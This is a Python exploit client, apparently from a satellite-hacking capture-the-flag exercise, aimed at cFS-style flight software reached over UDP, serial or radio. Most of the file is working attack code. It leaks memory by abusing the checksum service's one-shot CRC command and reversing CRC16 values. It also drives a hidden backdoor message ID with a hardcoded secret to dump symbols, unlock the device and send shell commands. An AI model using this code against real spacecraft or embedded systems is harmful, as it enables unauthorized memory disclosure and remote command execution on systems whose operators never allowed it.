import os, sys, time

from socket import socket
from select import select
from struct import pack, unpack
from binascii import hexlify, unhexlify
from hashlib import sha512


CS_CMD_MID      = 0x189F
CS_ONESHOT_CC   = 2 

CS_HK_TLM_MID   = 0x08A4

UART_CI_TO_MID  = 0x19D7
ENABLE_TLM_CC   = 0x07

MM_MID          = 0x1888
MM_NOOP         = 0x00

BACKDOOR_MID    = 0x1834
Secret = unhexlify(b'463b98fe1ee494bb')

def ccsds_checksum(data: bytes) -> int: 
    cs = 0xFF
    for b in data:
        cs ^= b
    return cs 

def cmd_msg(mid: int, cid: int, payload:bytes = b'') -> bytes:
    cmd_len = 8 + len(payload)
    message = pack( ">HHHB", mid, 0xC000, cmd_len - 7, cid )
    cs = ccsds_checksum(message + payload)
    message = unhexlify("DEADBEEF") + message + pack("B", cs) + payload 
    return message

def one_shot(address: int, length: int) -> bytes:
    return cmd_msg(CS_CMD_MID, CS_ONESHOT_CC, pack(">II", address, length)) 

def backdoor(payload: bytes, cmd: int) -> bytes:
    payload = Secret + pack("B", cmd) + b'\x00'*3 + payload
    return cmd_msg(BACKDOOR_MID, 0, payload)

def enable_tlm():
    return cmd_msg(UART_CI_TO_MID, ENABLE_TLM_CC)

def mm_noop():
    return cmd_msg(MM_MID, MM_NOOP)


CrcTable_8 = [
    
		    0x0000, 0xC0C1, 0xC181, 0x0140, 0xC301, 0x03C0, 0x0280, 0xC241,
		    0xC601, 0x06C0, 0x0780, 0xC741, 0x0500, 0xC5C1, 0xC481, 0x0440,
		    0xCC01, 0x0CC0, 0x0D80, 0xCD41, 0x0F00, 0xCFC1, 0xCE81, 0x0E40,
		    0x0A00, 0xCAC1, 0xCB81, 0x0B40, 0xC901, 0x09C0, 0x0880, 0xC841,
		    0xD801, 0x18C0, 0x1980, 0xD941, 0x1B00, 0xDBC1, 0xDA81, 0x1A40,
		    0x1E00, 0xDEC1, 0xDF81, 0x1F40, 0xDD01, 0x1DC0, 0x1C80, 0xDC41,
		    0x1400, 0xD4C1, 0xD581, 0x1540, 0xD701, 0x17C0, 0x1680, 0xD641,
		    0xD201, 0x12C0, 0x1380, 0xD341, 0x1100, 0xD1C1, 0xD081, 0x1040,
		    0xF001, 0x30C0, 0x3180, 0xF141, 0x3300, 0xF3C1, 0xF281, 0x3240,
		    0x3600, 0xF6C1, 0xF781, 0x3740, 0xF501, 0x35C0, 0x3480, 0xF441,
		    0x3C00, 0xFCC1, 0xFD81, 0x3D40, 0xFF01, 0x3FC0, 0x3E80, 0xFE41,
		    0xFA01, 0x3AC0, 0x3B80, 0xFB41, 0x3900, 0xF9C1, 0xF881, 0x3840,
		    0x2800, 0xE8C1, 0xE981, 0x2940, 0xEB01, 0x2BC0, 0x2A80, 0xEA41,
		    0xEE01, 0x2EC0, 0x2F80, 0xEF41, 0x2D00, 0xEDC1, 0xEC81, 0x2C40,
		    0xE401, 0x24C0, 0x2580, 0xE541, 0x2700, 0xE7C1, 0xE681, 0x2640,
		    0x2200, 0xE2C1, 0xE381, 0x2340, 0xE101, 0x21C0, 0x2080, 0xE041,
		    0xA001, 0x60C0, 0x6180, 0xA141, 0x6300, 0xA3C1, 0xA281, 0x6240,
		    0x6600, 0xA6C1, 0xA781, 0x6740, 0xA501, 0x65C0, 0x6480, 0xA441,
		    0x6C00, 0xACC1, 0xAD81, 0x6D40, 0xAF01, 0x6FC0, 0x6E80, 0xAE41,
		    0xAA01, 0x6AC0, 0x6B80, 0xAB41, 0x6900, 0xA9C1, 0xA881, 0x6840,
		    0x7800, 0xB8C1, 0xB981, 0x7940, 0xBB01, 0x7BC0, 0x7A80, 0xBA41,
		    0xBE01, 0x7EC0, 0x7F80, 0xBF41, 0x7D00, 0xBDC1, 0xBC81, 0x7C40,
		    0xB401, 0x74C0, 0x7580, 0xB541, 0x7700, 0xB7C1, 0xB681, 0x7640,
		    0x7200, 0xB2C1, 0xB381, 0x7340, 0xB101, 0x71C0, 0x7080, 0xB041,
		    0x5000, 0x90C1, 0x9181, 0x5140, 0x9301, 0x53C0, 0x5280, 0x9241,
		    0x9601, 0x56C0, 0x5780, 0x9741, 0x5500, 0x95C1, 0x9481, 0x5440,
		    0x9C01, 0x5CC0, 0x5D80, 0x9D41, 0x5F00, 0x9FC1, 0x9E81, 0x5E40,
		    0x5A00, 0x9AC1, 0x9B81, 0x5B40, 0x9901, 0x59C0, 0x5880, 0x9841,
		    0x8801, 0x48C0, 0x4980, 0x8941, 0x4B00, 0x8BC1, 0x8A81, 0x4A40,
		    0x4E00, 0x8EC1, 0x8F81, 0x4F40, 0x8D01, 0x4DC0, 0x4C80, 0x8C41,
		    0x4400, 0x84C1, 0x8581, 0x4540, 0x8701, 0x47C0, 0x4680, 0x8641,
		    0x8201, 0x42C0, 0x4380, 0x8341, 0x4100, 0x81C1, 0x8081, 0x4040

]

unlockInput = unhexlify( 
    b'4f833068544bc6c7ed762e8b463583ca4a1a55fb9de2d5c568eacebb73ddb8a3d4b53ab7774ad3ac85f14e5a648150065e2961faf93fa5ae211169817b277a44'
 )

class Comms: 

    def __init__(self):
                
        self.CrcTable_16 = []
        for ii in range(0,256):
            crc1 = CrcTable_8[ii]
            idx = crc1 & 0xFF
            crc1 = (crc1 >> 8) & 0xFF

            for jj in range(0,256):
                self.CrcTable_16.append( crc1 ^  CrcTable_8[ idx ^ jj ] )


    def send(self, data : bytes) -> int: 
        return 0

    def recv(self, length:int, timeout:int=0) -> bytes:
        return b""

    def crc16_arc(self, data : bytes) -> int:
        crc = 0
        for b in data:
            index = (crc ^ b) & 0xFF
            crc = ( (crc >> 8) & 0xFF ) ^ CrcTable_8[index]
        return crc

    def rev_crc16_arc_16(self, crc : bytes) -> bytes:
        idx = self.CrcTable_16.index(crc)
        return bytes([idx >> 8, idx & 0xFF])
    
    def _get_crc(self, address: int, length: int) -> bytes:
        self.send( one_shot(address, length) )

        while True:
            hk = self.recv_tlm(CS_HK_TLM_MID)
            offset = (6 + 6) + 1 * 12 + 2 * 8 + 4 * 3
            crc_addr, crc_size, crc = unpack(">III", hk[offset:offset+4*3])
            if (address == crc_addr and crc_size == 2):
                break
        return crc 

    def recv_tlm(self, mid: int) -> bytes:
        while True:
            packet = self.recv(1024)
            p_mid = unpack(">H", packet[4:6])[0]
            if p_mid == mid:
                return packet[4:] 


    def dump_mem(self, address: int, length: int) -> bytes:
        data = b""
        for addr in range(address, address + length, 2):
            crc = self._get_crc(addr, 2)
            self.send( one_shot(addr, 2) )

            data += self.rev_crc16_arc_16(crc & 0xFFFF)
        return data

    def find_diff(self, text, stride=0x10000):
        base_addr = text.sh_addr
        length = text.sh_size 
        stride = 0x10000
        for addr in range(base_addr, base_addr+length, stride):
            crc = self._get_crc(addr, stride)
            crc_o = text.read(addr, stride)
            if crc_o != crc:
                print("Mismatch at %08x, length %d" % (addr, stride))


    def backdoor_dump(self, symbol: bytes, offset: int, length: int) -> bytes:
        payload  = symbol + b'\x00' * (64-len(symbol))
        payload += pack(">II", offset, length)

        while True:
            self.send(backdoor(payload, 1))
            for _ in range(0,50):
                packet = self.recv(1024, 0.2)
                if b"DUMP:" in packet:
                    data = packet[5 + packet.index(b"DUMP:"):]
                    while len(data) < 2*length:
                        data += self.recv(2*length - len(data))
                    dump = unhexlify(data[:length*2])
                    return dump
                #time.sleep(0.1)
            time.sleep(1)

    def enable_tlm(self):
        self.send(enable_tlm())

    def backdoor_unlock(self):        
        payload = unlockInput 
        h = sha512()
        h.update(Secret)
        h.update(unlockInput)
        print(b'Hash we will make: ' + hexlify(h.digest()))
        self.send(backdoor(payload, 2))

    def backdoor_lock(self):
        self.send(backdoor(b'', 3))

    def backdoor_shell(self, cmds):
        payload = cmds + b'\x00' * (64 - len(cmds))
        payload += pack(">I", len(cmds))
        self.send(backdoor(payload, 4))
    
    def test_unlock(self):
        self.send(mm_noop())

import socket

class UDP_Comms(Comms): 

    def __init__(self, addr: str, s_port: int, r_port: int):
        super().__init__()

        # Send Socket (CMD)
        if (s_port > 0):
            self.s_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.send_addr = (addr, s_port)
        
        # Receive Socket (TLM)
        if (r_port > 0):
            self.s_recv = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.s_recv.bind((addr, r_port)) 


    def send(self, data : bytes) -> int: 
        print(b"Sending : " + hexlify(data))
        self.s_send.sendto(data, self.send_addr)

    def recv(self, length: int, timeout:int = 0) -> bytes:
        packet,_ = self.s_recv.recvfrom(length)
        #print(b"Read : "  + hexlify(packet))
        return packet

import serial
class Serial_Comms(Comms): 

    def __init__(self, path: str, baud:int=19200, timeout:int=3):
        super().__init__()

        self.ser = serial.Serial(path, baud, timeout=timeout)
    
    def send(self, data : bytes) -> int: 
        print(b"Sending : " + hexlify(data))
        sent = 0
        while sent < len(data):
            sent += self.ser.write(data[sent:])
        return sent

    def recv(self, length: int, timeout:int = 0) -> bytes:
        packet = self.ser.read(length)
        #print(b"Read : "  + hexlify(packet))
        return packet
    
class Radio_Comms(Comms): 

    def __init__(self, s_addr: str, r_addr: str, s_port: int, r_port: int):
        super().__init__()

        # Send Socket (CMD)
        if (s_port > 0):
            self.s_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.send_addr = (s_addr, s_port)
        
        # Receive Socket (TLM)
        if (r_port > 0):
            self.s_recv = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.s_recv.bind((r_addr, r_port)) 


    def send(self, data : bytes) -> int: 
        print(b"Sending : " + hexlify(data))
        self.s_send.sendto(b"L3:" + data, self.send_addr)

    def recv(self, length: int, r, timeout:int=0) -> bytes:
        packet = b''
        r_ready,_,_ = select([self.s_recv], [], [], timeout)
        if r_ready is not None:
            packet,_ = self.s_recv.recvfrom(length)
        #print(b"Read : "  + hexlify(packet))
        return packet
